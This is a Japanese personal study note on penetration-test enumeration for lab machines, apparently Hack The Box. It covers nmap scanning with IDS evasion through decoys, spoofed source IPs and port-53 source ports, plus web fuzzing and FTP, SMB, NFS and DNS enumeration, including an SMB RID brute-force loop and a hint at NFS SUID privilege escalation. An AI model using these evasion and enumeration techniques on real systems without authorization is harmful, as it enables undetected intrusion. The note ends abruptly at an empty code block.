# Enumeration (列挙)

## ホスト・OSベースの列挙

### ターゲットのOSを知る
```bash
ping -c 1 <IP>
````

- ttlの時間で判別する
    - `ttl=64` → Linux OS/Mac OS
    - `ttl=128` → Windows OS
    - `ttl=255` → UNIX OS/ネットワーク機器


### ターゲットの詳細なOSを知る
OpenSSHのバージョンを検索して、OSの詳細なバージョンを知る。
opensshのバージョンは、こんな感じで出てくる
```shell-session
sudo nmap -vvv -sCV -T4 -p0-65535 -Pn <IP>
```
「OpenSSH 8.2p1 Ubuntu 4ubuntu0.1」を検索
「launchpad.net」というサイトの中で、Ubuntu SSHパッケージの変更ログから、「openssh 1:8.2p1-4ubuntu0.1」とわかる
「ubuntuupdates.org」というサイトの中で「Release:	focal (20.04)」から、対象のOSはUbuntu 20.04とわかる。
→古いバージョンの OS に新しいアプリケーション パッケージをインストールすることも可能だから、あまり信用しすぎない。

---

### Nmapポートスキャン
HTB用
ペネトレーションテストとかだと、`-T2`とかにする。

```bash
sudo nmap -vvv -sCV -T5 -p0-65535 -Pn -A <IP>
```

| オプション              | 説明                                                                                                                                                                                                               |
| ------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| -sS                | 上位1000のTCPポートをスキャン<br>生のTCPパケットを作成するために必要なソケット権限から、root権限が必要                                                                                                                                                     |
| -sT                | デフォルトのスキャン方法 (TCP Connectスキャン)<br>TCP 3 ウェイ ハンドシェイクを使用して、ターゲット ホストの特定のポートが開いているか閉じているかを判断<br>スキャンは`SYN`パケットをターゲットポートに送信<br>ターゲットポートが`SYN-ACK`パケットで応答する場合はオープン<br>`RST`パケットで応答する場合はクローズド<br>ログに残りやすいが、確実な結果が返ってくる |
| -p-                | 全ポート(1～65535)をスキャン- `-p0-65535` は 0～65535 までスキャンするので、ポート0も含まれる点が異なる                                                                                                                                              |
| -F                 | 上位100ポートのみをスキャン- スキャン範囲が少ないため高速                                                                                                                                                                                  |
| --top-ports=10     | 上位10ポートのみをスキャン                                                                                                                                                                                                   |
| -p XX              | 指定されたポート(XX)のみをスキャン                                                                                                                                                                                              |
| --packet-trace     | 送受信されたすべてのパケットを表示                                                                                                                                                                                                |
| -n                 | DNS解決を無効にする                                                                                                                                                                                                      |
| --disable-arp-ping | ARP pingを無効にする                                                                                                                                                                                                   |
| --max-retries      | Nmapがターゲットから応答がなくて再試行する上限回数(デフォルトでは10)                                                                                                                                                                           |
| -Pn                | ICMPエコー要求を無効                                                                                                                                                                                                     |
| -sU                | UDPスキャン                                                                                                                                                                                                          |
| -sV                | サービスバージョンを検出する<br>各ポートで動作しているサービスのバージョン情報を取得しようとする                                                                                                                                                               |
| -sC                | Nmapのデフォルトスクリプトを実行する<br>サービス検出や脆弱性スキャンが行われることがある                                                                                                                                                                 |
| -sCV               | -sCと-sVを実行                                                                                                                                                                                                       |
| -vvv               | 詳細な出力を有効化する（デバッグ情報を増やす）<br>`-v` で基本的な詳細情報を表示、`-vv` でより詳細、`-vvv` で最も詳細な出力                                                                                                                                         |
| -oN                | `.nmap`ファイル拡張子でのデフォルトでの保存                                                                                                                                                                                        |
| -oG                | `.gnmap`ファイル拡張子を持つGrepable出力                                                                                                                                                                                     |
| -oX                | `.xml`ファイル拡張子を持つXML出力                                                                                                                                                                                            |
| -oA                | 結果を上の3つのすべての形式で保存する                                                                                                                                                                                              |
| --stats-every=5s   | ステータスを表示する間隔を決められる                                                                                                                                                                                               |
| --min-rate 300     | 毎秒同時に送信するパケットの最小数を設定<br>ネットワーク帯域幅がわかっていれば、送信されるパケットのレートで作業でき、スキャンが大幅に高速化できる<br>しかし、普通は難しいので`-T4`とかを使えばいい                                                                                                         |
| -D RND:5           | 接続元のIPを示す5つのランダムなIPアドレスを生成する                                                                                                                                                                                     |

応答種類

| **状態**             | **説明**                                                                                                  |
| ------------------ | ------------------------------------------------------------------------------------------------------- |
| `open`             | これは、スキャンされたポートへの接続が確立されていることを示しています。これらの接続は、**TCP接続**、**UDPデータグラム**、および**SCTPアソシエイション**にすることができます。      |
| `closed`           | ポートが閉じていると表示されると、TCPプロトコルは、受信したパケットに`RST`フラグが含まれていることを示します。このスキャン方法は、ターゲットが生きているかどうかを判断するためにも使用できます。    |
| `filtered`         | Nmapは、ポートのターゲットから応答が返されないか、ターゲットからエラーコードが取得されるため、スキャンされたポートが開いているか閉じられているかを正しく識別できません。                  |
| `unfiltered`       | このポートの状態は、**TCP-ACK**スキャン中にのみ発生し、ポートにアクセスできることを意味しますが、開いているか閉じているかを判断することはできません。                        |
| `open\|filtered`   | 特定のポートの応答が得られない場合、`Nmap`はその状態に設定します。これは、ファイアウォールまたはパケットフィルターがポートを保護する可能性があることを示しています。                   |
| `closed\|filtered` | この状態は、**IP ID**の**アイドル**スキャンでのみ発生し、スキャンされたポートがファイアウォールによって閉じられているかフィルタリングされているかを判断することは不可能であることを示しています。 |

#### スクリプトエンジン
こんな感じで使える
```shell-session
snowyowl644@htb[/htb]$ sudo nmap <target> --script <category>
```
なんかWindows系のサービスは結構`vuln`つけてやったりしてるよね
こんな感じで`--script "サービス名*"`って感じでね
```
nmap -p 80 --script "http-*" 10.129.241.215
```

| カテゴリ          | 説明                                                          |
| ------------- | ----------------------------------------------------------- |
| **auth**      | 認証情報（ユーザー名やパスワードなど）を特定するためのスクリプト                            |
| **broadcast** | ブロードキャストを利用してホスト探索を行い、発見されたホストを自動的に残りのスキャンに追加するスクリプト        |
| **brute**     | ブルートフォース攻撃を用いて対象サービスへのログインを試行するスクリプト                        |
| **default**   | `-sC` オプションで実行されるデフォルトのスクリプト                                |
| **discovery** | アクセス可能なサービスを評価・検出するスクリプト                                    |
| **dos**       | DoS (サービス妨害) 脆弱性をチェックするスクリプト。サービスに悪影響を及ぼす可能性があるため頻繁には使用されない |
| **exploit**   | スキャン対象ポートの既知の脆弱性を悪用しようとするスクリプト                              |
| **external**  | 外部のサービスを利用して追加情報を得るためのスクリプト                                 |
| **fuzzer**    | 様々なフィールドに異なる値を送信して、予期しない動作や脆弱性を発見するためのスクリプト。処理に時間がかかる場合がある  |
| **intrusive** | ターゲットシステムに悪影響を及ぼす可能性のある侵入的なスクリプト                            |
| **malware**   | 対象システムがマルウェアに感染していないかをチェックするスクリプト                           |
| **safe**      | 侵入的・破壊的でない、安全に実行できるスクリプト                                    |
| **version**   | サービス検出（バージョン情報など）を拡張するスクリプト                                 |
| **vuln**      | 特定の脆弱性を確認・検出するスクリプト                                         |
#### レポート作成
- ちなみに、XML出力を使用すると、技術に詳しくない人でも読みやすいHTMLレポートを簡単に作成できる
- 結果を詳細に明確に提示するため、後でドキュメント作成に非常に役立つ
- 保存された結果をXML形式からHTMLに変換するには、ツール`xsltproc`が使える
```shell-session
xsltproc target.xml -o target.html
```

#### 小技
- スキャン中に`[Space Bar]`を押すと、スキャンステータスが出力される
#### Firewallとルールの確認
- TCPポートはフィルタリングしてても、UDPポートをフィルタリングされてないことがあるので-sUも試す
	- UDPはステートレスプロトコルなので、スキャンもタイムアウトもはるかに長くなる
-  TCP ACK(`-sA`)スキャンは、一般的な SYNスキャン (`-sS`) や Connectスキャン (`-sT`) と比べて、ブロックされにくい
	- ACKスキャンは **「ポートが開いているか閉じているか」を正確に知る手段** というよりも、**「ファイアウォールでフィルタされているかどうか」を調べる**手段
- フィルタリングに引っかかったパケットは「ドロップ (無視)」されるか、「リジェクト (拒否)」されるかのいずれか

例
```shell-session
sudo nmap <IP> -p<空いてるポート> -sU -Pn -n --disable-arp-ping --packet-trace
```

```shell-session
sudo nmap <IP> -p<空いてるポート> -sA -Pn -n --disable-arp-ping --packet-trace
```

```shell-session
sudo nmap <IP> -n -Pn -p445 -O
```
#### IPS/IDSの検知
- ファイアウォールとそのルールとは異なり、IDS/IPSシステムはパッシブトラフィック監視システムであるため、検出がはるかに困難
- `IDS systems`ホスト間のすべての接続を検査します。IDSが定義されたコンテンツまたは仕様を含むパケットを見つけた場合、管理者に通知され、最悪の場合に適切な措置を取られる
- 判断する手法
	- 異なるIPアドレスを持つ複数の仮想プライベートサーバー（`VPS`）を使う
		- もう最初から複数のIPを用意しておいて、試してみる
		- ブロックされたら「しゃあない、IPS/IDSあるんかい！じゃあ、他のIPで！」って感じでやるしかないらしい。
	- そして、別の`VPS`で侵入テストを続ける
- 検知された時の流れ
	- 検知された時に、まず攻撃元IPアドレスがブロックされる
	- その結果、インターネットサービスプロバイダーに連絡されて、インターネットへのすべてのアクセスがブロックされる

##### IPS/IDSの回避？(撹乱)
- **Decoy（デコイ）スキャン（`-D`）の利用**
    - Nmap は送信元を偽装するために、IPヘッダに複数のランダムなIPアドレスを混在させる機能
    - `-D RND:5` のように指定すると、5つのランダムIPを生成し、自分の本当のIPアドレスを混ぜる
- DecoyのIPは実際に応答がある“生きている”IPの方がいい
    - しかし、ランダム機能（RND:x）を使用すると、必ずしも“生きている”アドレスが選ばれる保証はない。
    - Decoyに指定するIPは、できる限り「応答が確認できる実在ホスト」を使うほうが効果的。
    - その結果、フィルタリングや偽装失敗のリスクが高まるので、もし可能なら **「応答があるデコイIP」を手動設定するのが理想**

```shell-session
sudo nmap <IP> -p- -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5
```
- なりすましされたパケットは、同じネットワーク範囲から来ている場合でも、ISPやルーターによって除外されることがよくある
- なので、VPSサーバーのIPアドレスを指定し、IPヘッダーの「`IP ID`」操作と組み合わせて使用してターゲットをスキャンすることもできる
- 別のシナリオは、個々のサブネットのみがサーバーの特定のサービスにアクセスできないこと
	- そのため、ソースIPアドレス（`-S`）を手動で指定して、これでより良い結果が得られるかどうかをテストすることもできる
```shell-session
sudo nmap 10.129.2.28 -n -Pn -p 445 -O -S 10.129.2.200
```

#### DNSプロキシによる回避
- **Nmapの動作とDNS**
    - 通常、Nmapはデフォルトで逆引き（Reverse DNS）を行う
    - 従来はUDPの53番ポートでDNS問い合わせをするのが一般的だったが、最近はDNSSECやIPv6の導入でTCPの53番ポートを使うケースも増えている
- **DNSサーバーの指定**
    - `--dns-server <サーバー1>,<サーバー2>` としてDNSサーバーを手動設定する
    - DMZのような環境では、内部DNSサーバーを使うことで企業内部のホストと通信しやすくなる（外部よりも信頼されている）
- **送信元ポートを53番として偽装**
    - `--source-port 53` を指定すると、Nmapが送るパケットの“送信元”が53番ポートになる。
    - ファイアウォールやIDS/IPSが「53番ポートからの通信＝DNSトラフィック」として許可している場合、セキュリティルールをすり抜けられる可能性がある
```shell-session
sudo nmap <IP> -p<空いてるポート> -sS -Pn -n -sV --disable-arp-ping --packet-trace --source-port 53
```


#### 回避テクニック詰め込みコマンド
- 上のテクニックを全部詰め込んだ
- 末尾最初は`-F`とかですかねえ〜
- それで、**空いてるポートがわかったら、`-p`で指定してもいい**と思うんだけど、そもそも`-F`にないポートがクリティカルだとだるいのであんまり信頼しすぎないように。(未来の自分へ、フラグ立てとくね🏴‍☠️

UDP

```shell-session
sudo nmap <IP> -sU -Pn -n -vvv --disable-arp-ping --packet-trace -D RND:5 --source-port 53 -oA "scan_output" -T2 -F
```

TCP
```shell-session
sudo nmap <IP> -sA -Pn -sCV -vvv --n --disable-arp-ping --packet-trace -D RND:5 --source-port 53 -oA "scan_output" -T2 -F
```

ポートがわかったなら、これでも取得できる
```shell-session
snowyowl644@htb[/htb]$ ncat -nv --source-port 53 10.129.2.28 50000
```


---

## Webサーバ上のディレクトリ列挙

- 特定のページにアクセスできる隠しファイルやフォルダを見つけるのに最適
### Feroxbuster 
えぐいディレクトリスキャナー
一つの隠しフォルダ見つけたら、その中で再起的にディレクトリスキャンしてくれる
```bash
feroxbuster -u <http://TARGET>
```

### Dirsearch
HTBにはdirsearch入ってないので、dirsearchを入れるところから
```bash
sudo apt install dirsearch -y
```

両方大事
```bash
dirsearch -u <domain> -t 50 -i 200
```

```bash
sudo dirsearch --url=http://popcorn.htb --wordlist=/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --threads 30 --random-agent --format=simple
```

### ffuf
サブディレクトリの検索に使える
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://<domain> -H "Host: FUZZ.<domain>" -mc 200
```
 - 注意点としては、サブドメインにも、hostsで設定しないとサーバーエラーになる```
- `-mc 200`で、フィルタリングしてるのに、全部200でバーっと出てくる時は、`-fs`でサイズでフィルタリングするといい感じになる

---

### VHOST（仮想ホスト）の列挙

```bash
gobuster vhost -u http://<IP> -w /usr/share/wordlists/vhosts.txt
```

### Whatweb
```
whatweb <http://...>
```
便利なツールであり、ネットワーク全体の Web アプリケーションの列挙を自動化する多くの機能を備えている
```shell-session
whatweb --no-errors 10.10.10.0/24
```

### robots.txt
robots.txtが見つかったら、disallowに注目する

### EyeWitness
ターゲットWebアプリケーションのスクリーンショットを撮り、指紋を取得し、可能なデフォルトの資格情報を識別するために使用できる
https://github.com/RedSiege/EyeWitness

---

## サイト脆弱性スキャン

```bash
nikto -h http://<IP>
```

## FTP
- FTPでは、TCP20,21を使う
	- まず、クライアントとサーバーが`TCP port 21`で制御チャネルを確立する
	- 次に、`TCP port 21`を介して制御チャネルを確立する
	- そして、`TCP port 20`を介してデータチャネルを確立する
### FTP匿名ログイン

```bash
ftp -p <IP>
```

- ユーザー名: `anonymous` または `ftp`
- パスワード: 空欄でEnter

### TFTP
- FTPクライアントとは異なり、`TFTP`にはディレクトリリスト機能はない
- FTPにあるような認証はないので、TFTP はローカルおよび保護されたネットワークでのみ使用できる

| コマンド      | 説明                                                            |
| --------- | ------------------------------------------------------------- |
| `connect` | ファイル転送用のリモートホスト、オプションでポートを設定します。                              |
| `get`     | リモートホストからローカルホストにファイルまたはファイルセットを転送します。                        |
| `put`     | ローカルホストからリモートホストにファイルまたはファイルセットを転送します。                        |
| `quit`    | tftpを終了します。                                                   |
| `status`  | 現在の転送モード（asciiまたはバイナリ）、接続ステータス、タイムアウト値など、tftpの現在のステータスを表示します。 |
| `verbose` | 冗長モードをオンにします。これにより、ファイル転送中に追加情報が表示されます。オンまたはオフになります。          |

### vsFTPd
- Linuxベースのディストリビューションで、一番多く使われてる
- vsFTPdのデフォルト設定は`/etc/vsftpd.conf`にある
- FTPユーザーファイル
```shell-session
cat /etc/ftpusers
```
- vsFTPdサーバーに接続するとすぐに、FTPサーバーのバナー
	- `service`説明とその`version`が含まれている
	- FTPサーバーのシステムの種類
- サーバーの設定の概要を取得するコマンド
	- status
	- debug
	- trace
	- ls
	- ls -R
		- 再帰的リスト
	- wget -m --no-passive ftp://anonymous:anonymous@<IP>
		- 利用可能なすべてのファイルをダウンロード
		- ターゲットのIPアドレスの名前を含むディレクトリを作成して保存される
	- put `FILE`
		- 現在のフォルダ内のファイルをFTPサーバーにアップロードできる
### 情報収集(コマンド)
- FTPのNmapスクリプト、検索できる
```shell-session
find / -type f -name ftp* 2>/dev/null | grep scripts
```
- `ftp-anon` NSEスクリプト: FTPサーバーが匿名アクセスを許可しているかどうかを確認する
    - 匿名アクセスが許可されている場合は、匿名ユーザーが見られるFTPルートディレクトリの内容を表示
- `ftp-syst` NSEスクリプト: STATコマンドを実行し、FTPサーバーのステータス、構成、バージョンなどの情報を取得する

### TLS/SSL暗号化されたFTPサーバーの場合
- TLS/SSLに対応したクライアントが必要となる
- opensslクライアントを使用することで、FTPサーバーと通信が可能
- opensslを使えばSSL証明書を確認できるため、追加の情報収集にも役立つ
- SSL証明書により、たとえば`hostname`を認識でき、ほとんどの場合、組織または会社の`email address`もわかる
```shell-session
openssl s_client -connect 10.129.14.136:21 -starttls ftp
```

---

## Samba(SMB)
- UNIX/LinuxマシンなどでSMBを使ったファイルやプリンタの共有を実現するためのソフトウェア。
- Windowsマシンとファイル共有をしたり、ドメインコントローラ機能を提供したりできる。
	- 同じworkgroupに入れることができる
	- NetBIOS環境では、ネットワーク上の各ホスト（コンピュータ）は一意の名前（NetBIOS名）を持ち、通信時に使用される
	- 名前の登録には「NetBIOSネームサーバー（NBNS）」「Windows Internet Name Service (WINS)」が使われる
-  SMBとSambaの関係性
	- Windowsを中心に、ファイル共有やプリンタ共有のために使われるプロトコル。
	- “SMB/CIFS”とも呼ばれ、ローカルネットワーク上でのファイル操作を可能にする。
	- 新しいWindows環境と古いWindows環境の間でも下位互換性があり、Sambaを使うことでLinuxやUnixでもSMBを利用できる

| **SMBバージョン** | **対応OS**                            | **主な機能**                              |
| ------------ | ----------------------------------- | ------------------------------------- |
| CIFS         | Windows NT 4.0                      | NetBIOSインターフェイスを介した通信                 |
| SMB 1.0      | Windows 2000                        | TCPを利用した直接接続                          |
| SMB 2.0      | Windows Vista, Windows Server 2008  | パフォーマンス向上、メッセージ署名の強化、キャッシュ機能          |
| SMB 2.1      | Windows 7, Windows Server 2008 R2   | ロック機構                                 |
| SMB 3.0      | Windows 8, Windows Server 2012      | マルチチャネル接続、エンドツーエンド暗号化、リモートストレージへのアクセス |
| SMB 3.0.2    | Windows 8.1, Windows Server 2012 R2 | （明示的な追加機能情報なし）                        |
| SMB 3.1.1    | Windows 10, Windows Server 2016     | 整合性チェック、AES-128暗号化                    |

### デフォルト設定の把握
```shell-session
snowyowl644@htb[/htb]$ cat /etc/samba/smb.conf | grep -v "#\|\;" 
```
- グローバル設定とプリンター向けの2つの共有が表示される
	- グローバル設定は、すべての共有に使用される利用可能なSMBサーバーの構成
	- 個々の共有では、グローバル設定が上書きされる可能性があり、誤って設定される可能性が高い
#### 注目すべき誤った設定

| 設定項目                          | 説明                               |
| ----------------------------- | -------------------------------- |
| **browseable = yes**          | 現在の共有内で利用可能な共有を一覧表示できるようにしますか？   |
| **read only = no**            | ファイルの作成や変更を禁止しますか？               |
| **writable = yes**            | ユーザーにファイルの作成や変更を許可しますか？          |
| **guest ok = yes**            | パスワードなしでこのサービスに接続できるようにしますか？     |
| **enable privileges = yes**   | 特定のSIDに割り当てられた権限を有効にしますか？        |
| **create mask = 0777**        | 新しく作成されるファイルにどのようなアクセス権を設定するか？   |
| **directory mask = 0777**     | 新しく作成されるディレクトリにどのようなアクセス権を設定するか？ |
| **logon script = script.sh**  | ユーザーのログイン時に実行するスクリプトは何か？         |
| **magic script = script.sh**  | スクリプトが終了する際に実行するスクリプトは何か？        |
| **magic output = script.out** | スクリプトの出力を保存するファイルは何か？            |

### smbclient
- `anonymous`ユーザーでアクセスして、サーバーの共有リストを表示する
	- -L : サーバーの共有リスト
	- -N  : 有効なパスワードの入力なしで
 ```shell-session
smbclient -N -L //<IP>
```

- 上で取得したSharenameのディレクトリに移動する
	- `get`コマンドを使用してファイルやフォルダをダウンロードできる
	- 最初に!を使用してローカルシステムコマンドを実行することもできる（`!<cmd>`)
```shell-session
smbclient //<IP>/<Sharename>
```

ユーザーbobとしてログインする
```shell-session
smbclient -U bob \\\\<IP>\\users
```

- 管理をするとき、`smbstatus`で接続を確認できる
	- 他の人がまだアクセスできるサブネット（おそらく孤立したもの）に入ったら、特に重要
	- ドメインレベルのセキュリティでは、サンバサーバーはWindowsドメインのメンバーとして機能
	- 各ドメインには、パスワード認証を提供する Windows NT サーバーに少なくとも 1 つのドメイン コントローラーがある
	- ドメインコントローラーは、ワークグループに決定的なパスワードサーバーを提供する
	- ドメインコントローラーは、独自の`NTDS.dit`および`Security Authentication Module`（`SAM`）でユーザーとパスワードでユーザーを認証する
```shell-session
smbstatus
```


### 情報収集(コマンド)

SMBからOSのバージョンを検出する
```shell-session
nmap --script smb-os-discovery.nse -p445 <IP>
```

SMBの脆弱性スキャン
```shell-session
nmap --script=smb-vuln* <IP>
```
### rpcclient
- `rpcclient`は、SMBサーバーで特定の機能を実行して情報を取得できる

```shell-session
rpcclient -U "" <IP>
```

rpcclientで使えるコマンド

| クエリコマンド         | 説明                                     |
| --------------- | -------------------------------------- |
| srvinfo         | サーバーの情報を取得する。                          |
| enumdomains     | ネットワーク上に展開されているすべてのドメインを列挙する。          |
| querydominfo    | 展開されているドメインのドメイン情報、サーバー情報、ユーザー情報を取得する。 |
| netshareenumall | 利用可能なすべての共有を列挙する。                      |
| netsharegetinfo | 指定した共有に関する情報を取得する。                     |
| enumdomusers    | ドメイン上のすべてのユーザーを列挙する。                   |
| enumdomgroups   | ドメインに存在するすべてのグループを列挙する                 |
| queryuser [RID] | 指定したユーザー（RID ベース）の情報を取得する。             |
#### ユーザー・グループ列挙
1. enumdomusersでユーザーのRIDを取得
2. queryuser [RID]でユーザーの情報を取得

```shell-session
rpcclient $> enumdomusers

user:[mrb3n] rid:[0x3e8]
user:[cry0l1t3] rid:[0x3e9]

rpcclient $> queryuser 0x3e9

        User Name   :   cry0l1t3
        Full Name   :   cry0l1t3
... ユーザー情報
```

- ユーザー列挙の例と同じで、それぞれのコマンドをgroup版に変更すればいいだけ

#### ブルートフォースによるユーザーRIDの特定
rpcclientを使用したユーザーRIDの特定
	- `enumdomusers`では、許可されたユーザーのみが出力される
	- なのでブルートフォースによって許可されてないユーザーも出力させる
	- 絶対やれ
```shell-session
for i in $(seq 500 1100);do rpcclient -N -U "" <IP> -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
```

samrdump.pyでも同様のことができる
```shell-session
samrdump.py 10.129.14.128
```

 上のrpcclientで行ったことは、[SMBMap](https://github.com/ShawnDEvans/smbmap) とか [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)でもできる
```shell-session
smbmap -H 10.129.14.128
crackmapexec smb 10.129.14.128 --shares -u '' -p ''
```
 

### enum4linux-ng
インストール
```shell-session
git clone https://github.com/cddmp/enum4linux-ng.git
cd enum4linux-ng
pip3 install -r requirements.txt
```

綺麗に列挙してくれる
```shell-session
./enum4linux-ng.py <IP> -A
```

---

## NFS
- 目的は、SMBと同じで、ネットワークを介してローカルであるかのようにファイルシステムにアクセスすること
- [NFS](https://en.wikipedia.org/wiki/Network_File_System)は、LinuxとUnixシステムの間で使われる
- NFSは、分散ファイルシステム

| **バージョン** | **特徴**                                                                                                                                                              |
| --------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **NFSv2** | 古いバージョンだが、多くのシステムでサポートされており、当初は完全に UDP 上で動作していた。                                                                                                                    |
| **NFSv3** | 可変ファイルサイズの対応やエラー報告の改善など、多くの機能が追加されたが、NFSv2 クライアントとは完全な互換性がない。                                                                                                       |
| **NFSv4** | Kerberos に対応し、ファイアウォールやインターネット経由で動作可能。ポートマッパーが不要になり、ACL（アクセス制御リスト）をサポート。状態ベースの操作を適用し、パフォーマンスとセキュリティの向上が図られている。また、NFS で初めて **ステートフルプロトコル**（接続状態を保持する通信方式）を採用したバージョン。 |
#### デフォルト設定の把握
- `/etc/exports`ファイルには、クライアントがアクセスできるNFSサーバー上の物理ファイルシステムのテーブルが書いてある
- [NFSエクスポートテーブルは](http://manpages.ubuntu.com/manpages/trusty/man5/exports.5.html)、どのオプションを受け入れるかを示し、したがってどのオプションが利用可能かを示す
```shell-session
cat /etc/exports 
```
上のコマンドによって出力されるドキュメントの中のオプション一覧

| Option           | Description                                                                       |
| ---------------- | --------------------------------------------------------------------------------- |
| rw               | 読み書きの権限を許可する。                                                                     |
| ro               | 読み取り専用の権限を設定する。                                                                   |
| sync             | 同期データ転送を使用。（やや遅い）                                                                 |
| async            | 非同期データ転送を使用。（やや高速）                                                                |
| secure           | 1024 番以上のポートを使用しない。                                                               |
| insecure         | 1024 番以上のポートを使用する。                                                                |
| no_subtree_check | サブディレクトリツリーのチェックを無効にする。                                                           |
| root_squash      | root（UID/GID 0）のファイルのすべての権限を匿名 UID/GID に割り当て、NFS マウント上で root がファイルにアクセスできないようにする。 |
#### 注目すべき誤った設定
- rw
- insecure
と下の二つ

| option         | description                                                                   |
| -------------- | ----------------------------------------------------------------------------- |
| nohide         | エクスポートされたディレクトリの下に別のファイルシステムがマウントされている場合、そのディレクトリは独自のエクスポートエントリによってエクスポートされる。 |
| no_root_squash | root が作成したファイルは、そのまま UID/GID 0 の権限を保持する。                                      |
### 情報収集(コマンド)
```shell-session
sudo nmap --script nfs* <IP> -sV -p111,2049
```

### NFSサービスを発見したら

#### ローカルマシンにマウント
	1. このために、NFS共有がマウントされる新しい空のフォルダを作成できる
	2. マウントすると、ローカルシステムと同じようにコンテンツを表示できる
	3. 表示および表示可能なファイルが属する権利、ユーザー名、およびグループにアクセスする

具体的なコマンド
- 利用可能なNFSを表示する
```shell-session
showmount -e <IP>
```

- NFSのマウント
```shell-session
mkdir target-NFS
sudo mount -t nfs <IP>:/ ./target-NFS/ -o nolock
cd target-NFS
tree .
```

- ユーザー名とグループ名を含むリストの表示
```shell-session
ls -l mnt/nfs/
```
- UIDとGUIDを含むリストコンテンツ
```shell-session
ls -n mnt/nfs/
```

- root_squash オプションが設定されている場合、root であってもファイルを編集できない。
- NFS を利用して権限昇格を試みることも可能!!!
	- 例えば、SSH でシステムにアクセスできる場合、他のフォルダ内の特定ユーザーが読み取れるファイルを取得するための方法がある。
	- そのユーザーの SUID を持つシェルを NFS 共有にアップロードし、SSH ユーザーとして実行することで、そのユーザー権限で操作可能になる。

#### アンマウント
```shell-session
cd ../
sudo umount ./target-NFS
```

---
## DNS
- ドメインとIPの名前解決
- DNS クエリにはさまざまな `DNS records`が使用され、それぞれにさまざまなタスクがある
- さらに、ドメインのメールサーバーやその他のサーバーを設定できるため、さまざまな機能に個別のエントリがある
- FQDNとは
	- **インターネット上のホスト（コンピューターやサーバー）を一意に識別するための完全なドメイン名**
		- `www.google.com`
		- `mail.yahoo.co.jp`
		- `ns1.inlanefreight.htb`
	- FQDNは、DNSで一意に識別される


| DNSレコード | 説明                                                                                                                                        |
| ------- | ----------------------------------------------------------------------------------------------------------------------------------------- |
| A       | 要求されたドメインの **IPv4アドレス** を返す。                                                                                                              |
| AAAA    | 要求されたドメインの **IPv6アドレス** を返す。                                                                                                              |
| MX      | ドメインに対する **メールサーバーの情報** を返す。                                                                                                              |
| NS      | ドメインの **DNSサーバー（ネームサーバー）** を返す。                                                                                                           |
| TXT     | 様々な情報を含むレコード。Google検索コンソールの検証、SSL証明書の検証、SPFやDMARCを用いたメール認証・スパム防止などに使用される。                                                                 |
| CNAME   | 別のドメインの **エイリアス** として機能する。例: `www.example.com` を `example.com` と同じIPにする場合、`example.com` の A レコードを設定し、`www.example.com` の CNAME レコードを作成する。 |
| PTR     | **逆引きDNS（リバースルックアップ）** に使用され、IPアドレスを対応するドメイン名に変換する。                                                                                       |
| SOA     | ドメインのゾーンファイルにある<br>ドメインの操作を担当する人と、ドメインのDNS情報の管理方法を表示してくれる<br>**DNSゾーン情報** と **管理者のメールアドレス** を提供する。                                        |


全てのDNSサーバーは、3つの異なる構成ファイルで動作する
1. ローカルDNS構成ファイル
2. ゾーンファイル
3. 逆名解決ファイル

- DNSサーバー[Bind9](https://www.isc.org/bind/)は、Linuxベースのディストリビューションで非常に頻繁に使用される
	- ローカル構成ファイル（`named.conf`）は、大まかに2つのセクションに分かれている
	- 1つ目は、一般設定のオプションセクション、2つ目は、個々のドメインのゾーンエントリ
- `/etc/bind/named.conf.local`
- `named.conf.options`
- `named.conf.log`

- **ゾーンの定義**
    - さまざまなゾーンを定義可能
    - ゾーンは個々のファイルに分割
    - 通常1つのドメインに対応（一部例外あり）
    - ISPやパブリックDNSサーバーは例外
- **ゾーンファイルの概要**
    - BIND形式で記述されるテキストファイル
    - DNSツリーにおける委任ポイント
    - 業界標準のゾーンファイルフォーマット
ゾーンファイルの中身を見る
```shell-session
cat /etc/bind/db.domain.com
```


- Fully Qualified Domain Name（FQDN）からIPアドレスを解決するには、DNSサーバーに逆ルックアップファイルが必要
- コンピューター名（FQDN）は、PTRレコードを使用して、それぞれのホストに対応するIPアドレスの最後のオクテットに割り当てられる。
- PTRレコードはIPを名前に逆変換する
逆名前解決ゾーンファイルの中身をみる
```shell-session
cat /etc/bind/db.10.129.14
```

### 注目すべき誤った設定
- DNSサーバーが攻撃される方法はたくさんある
- BIND9サーバーを標的とする脆弱性のリストは、[CVEdetails](https://www.cvedetails.com/product/144/ISC-Bind.html?vendor_id=64)で見つけることができる
- DNSサーバーに対する最も一般的な攻撃の[リスト](https://securitytrails.com/blog/most-popular-types-dns-attacks)もある
- 以下に示す設定の一部は、とりわけこれらの脆弱性につながる
	- DNSは非常に複雑になり、エラーがこのサービスに侵入しやすいため、管理者は正確な解決策が見つかるまで問題を回避する必要がある

| オプション           | 説明                                |
| --------------- | --------------------------------- |
| allow-query     | DNSサーバーへの問い合わせを許可するホストを定義します。     |
| allow-recursion | DNSサーバーへの再帰的な問い合わせを許可するホストを定義します。 |
| allow-transfer  | DNSサーバーからのゾーン転送を受信できるホストを定義します。   |
| zone-statistics | ゾーンに関する統計情報を収集します。                |

#### 情報収集(コマンド)
以下のそれぞれのレコードの照会は、全て「AUTHORITY SECTION」に聞いてる答えが返ってくる
- NS（ネームサーバー）レコードの照会
	- このドメインのネームサーバー（NS）はどこ？って聞いてる
```shell-session
dig ns inlanefreight.htb @10.129.14.128
```

- SOAレコードの照会
	- このドメインの管理情報を教えて？
	- メールアドレスのドット（.）は、at記号（@）に置き換えられる
```shell-session
dig soa www.inlanefreight.com
```

- DNSサーバーのバージョンを取得
	- このDNSサーバーはどのバージョンのBINDを使っている？
```shell-session
dig CH TXT version.bind 10.129.120.85
```

- 可能な限り多くの情報を取得
```shell-session
dig any inlanefreight.htb @10.129.14.128
```

- ゾーン転送が許可されている場合、このドメインのすべてのDNSレコードが取得できる
	- これが成功すると、攻撃者に **内部ネットワークの情報が漏れる可能性がある。**
```shell-session
dig axfr inlanefreight.htb @10.129.14.128
```

```shell-session
dig axfr internal.inlanefreight.htb @10.129.14.128
```


- サブドメインブルートフォース
```shell-session
